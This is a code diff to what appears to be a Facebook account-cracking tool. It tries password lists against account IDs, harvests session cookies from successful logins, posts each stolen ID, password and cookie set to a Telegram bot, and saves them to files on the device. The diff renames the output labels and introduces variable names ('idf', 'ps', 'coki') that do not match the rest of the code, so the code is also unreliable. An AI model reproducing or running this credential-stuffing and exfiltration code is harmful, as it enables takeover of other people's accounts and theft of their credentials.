@@ -2033,15 +2033,15 @@ def __MTDSIX__(ids, names, passlist, total_ids):
             session = requests.Session()
             free_fb = session.get('https://m.facebook.com').text
             data = {
-            "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
-            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
-            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
-            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
-            "try_number":"0",
-            "unrecognized_tries":"0",
-            "email":ids,
-            "pass":pas,
-            "login":"Log In"}
+    "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
+   "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
+   "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
+   "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
+   "try_number":"0",
+   "unrecognized_tries":"0",
+   "email":idf,
+   "pass":ps,
+   "login":"Log In"}
             headers ={'authority':'m.facebook.com',
             'method': 'POST',
             'scheme': 'https',
@@ -2058,20 +2058,20 @@ def __MTDSIX__(ids, names, passlist, total_ids):
             'sec-fetch-user': '?1',
             'upgrade-insecure-requests': '1',
             'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Mobile Safari/537.36'}
-            lo = session.post('https://bn-in.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=100',data=data,headers=headers).text
+            lo = session.post('https://www.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=100',data=data,headers=headers).text
             log_cookies=session.cookies.get_dict().keys()
             if 'c_user' in log_cookies:
                 kuki=";".join([f"{key}={session.cookies.get(key)}" for key in ['sb', 'datr', 'ps_n', 'ps_l', 'locale', 'c_user', 'xs', 'fr', 'usida', 'wd', 'm_ls', 'presence']])
                 cid = coki[65:80]
-                print(f'\r\r{rad}[{green}BITHIKA-OK{rad}]{green} {cid} {rad}: {green}{pas}')
+                print(f'\r\r{rad}[{green}ATOM-OK{rad}]{green} {cid} {rad}: {green}{pas}')
                 print(f"\r\r{rad}[{green}COOKIES=[🤖]{rad}]: {warna}{kuki}")
                 cek_apk(kuki)
                 oks.append(cid)
                 statusok = (f" {cid} | {pas} | {kuki} ")
                 requests.post(f"https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(statusok))
-                open('/sdcard/BITHIKA-OK.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/BITHIKA-M6-OK-COOKIE.txt','a').write(cid+'|'+pas+'|'+kuki+'\n')
+                open('/sdcard/ATOM-OK.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/ATOM-OK-COOKIE.txt','a').write(cid+'|'+pas+'|'+kuki+'\n')
                 break
-            elif "User must verify their account" in lo:
+            elif "checkpoint" in log_cookies:
                 cps.append(ids)
                 print(f'\r\r{rad}[BITHIKA-CP]{rad} {ids} {rad}| {pas}')
                 open('/sdcard/BITHIKA-CP.txt', 'a').write(ids + '|' + pas + '\n')
